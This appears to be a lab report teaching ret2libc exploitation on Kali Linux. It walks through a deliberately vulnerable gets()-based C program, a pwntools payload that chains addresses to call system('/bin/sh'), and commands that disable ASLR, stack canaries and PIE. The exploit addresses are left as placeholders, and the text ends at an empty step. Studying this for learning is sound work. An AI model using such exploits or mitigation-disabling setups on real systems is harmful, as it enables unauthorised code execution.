# Ret2libc Exploitation Technique on Kali Linux via Buffer Overflow in a vulnerable C program


## Introduction

In this report, we are going to analyze the return to libc attack technique, which we saw as a code reuse circumvention idea to the W^X mitigation technique.
This exploitation allows an attacker that identified potentially useful functions and data in the standard C libc library, to execute arbitrary functions overwriting the return address on the stack.
Our demonstration is going to be done by using a virtual machine running Kali Linux x86_64 and a precisely crafted C program, which uses the now deprecated gets() function to cause a stack overflow. The objective is to obtain an interactive shell (/bin/sh) abusing only code present in the running process, without any code injection.
We are going to be executing the attack in ideal conditions for an attacker, all mitigations, such as ASLR, stack canary and PIE are going to be disabled. We will then observe how the "normal" scenario with all the mitigations active prevent the attack, unless a proper exploit is developed.

## Environment & Setup

The exploit was developed and tested using the following:

- **Operating System**: Kali GNU/Linux, version 2026.1
- **Architecture**: x86_64
- **OS configuration**: ASLR mitigation disabled via
```
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
- **Compiler**: `gcc` with the following security mitigations disabled:
  - `-fno-stack-protector` — disables stack canary
  - `-z execstack` — marks the stack as executable
  - `-no-pie` — disables Position Independent Executable

## Utilized Tools

- **GDB + pwndbg** — used for debugging and memory analysis
  ([github.com/pwndbg/pwndbg](https://github.com/pwndbg/pwndbg))
- **pwntools** — A python library for exploit development
  ([docs.pwntools.com](https://docs.pwntools.com/))
- **ROPgadget** — used to search for ROP gadgets in binaries
  ([github.com/JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget))
- **checksec** — used to inspect binary security mitigations

## Memory unsafe C program

The target of our exploit is a small C program which was pupusefully designed to cause stack-based buffer overflow. The vulnerability lies in the use of `gets()`, a depreciated unsafe function which unlike its "safer" alternatives (`fgets`, `read`), that can still be overflowed, `gets()` accepts input until a newline or EOF is encountered not limiting the number of characters read, which can lead to buffer overflows.

If we give this function more bytes than the buffer can store, the extra bytes spill into the stack and overwrite the saved return address — the value the CPU uses to know where to jump when the function ends. If we control that address, we control where the program goes.

## Exploit

We remind that we are going to disable all mitigations for the purpouse of this exploit. We are going to see how if ASLR is enabled this wouldn't work due to the randomization of the address space. If that was the case we would either need a shellcode that obtains the address of a variable whose relative address to shellcode is know, or try and brute-force segment locations.

```
#!/usr/bin/env python3
from pwn import *

system_addr = address of the system function in libc
binsh_addr  = address of the /bin/sh string in libc
pop_rdi     = address of the gadgets in libc
ret         = address of the gadget composed only by the ret instruction

offset = 88

payload  = b"A" * offset
payload += p64(ret)              
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p = process('./vuln')
p.sendline(payload)
p.interactive()
```
We are going to utilize this simple python script to spawn an interactive shell.
- ``` from pwn import * ``` imports all the functions of the pwntool library.
- ``` system_addr , /bin/sh , pop_rdi, ret ``` are variable assignments where every line is going to be filled with the corresponding address
- ``` offset``` is the number of bytes to write before reaching the saved RIP on the stack 
- ```payload``` — the bytes we send to the program. They are arranged in a specific order so that, after the buffer overflow, the program ends up calling `system("/bin/sh")` and gives us a shell. The first part of the payload is padding to fill the buffer, while the rest is a chain of addresses that tells the CPU what to do step by step, reusing pieces of code already present in libc.
- ```p = process('./vuln')``` starts the binary as a subproces of the python script
- ```p.sendline(payload)``` sends the payload to the stdio of the process
- ```p.interactive()``` opens a an interactive channel between the terminal and process
  
## C Program

Since in this demo we are acting as both attacker and defender, we first need a target. The following is the vulnerable C program that uses `gets()` to expose a stack buffer overflow. The use of `gets()` is intentional: this function does not check whether the input fits within the bounds of the destination buffer, allowing us to write into memory regions of our choice.
```
#include <stdio.h>

extern char *gets(char *s); //required or else it would result in implicit function declaration error

void read_message() {
    char buffer[80];
    printf("Enter message: ");
    gets(buffer);
    printf("Message received: %s\n", buffer);
}

int main() {
    read_message();
    return 0;
}
```

## Executing the exploit

### 1) Cheking the default ASLR setting

By default the output should be 2, we are going to be disabling it.

```bash
cat /proc/sys/kernel/randomize_va_space
```


### 2) Creating the directory and vulnerable file

We are going to be placing our vulnerable code in the vuln.c file

```bash
mkdir ~/ret2libc
cd ~/ret2libc
nano vuln.c
```

### 3) Disabling ASLR & Compiling the binary with compiler mitigations disabled

In order to disable ASLR the users password is requested, if the output is 0 ASLR is disabled

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

```bash
gcc -fno-stack-protector -z execstack -no-pie -g vuln.c -o vuln
```
- ```-fno-stack-protector``` disables stack canary
- ```-z execstack ``` executable stack
- ```-no-pie``` fixes the binary base address

### 4) Check if mitigations are disabled




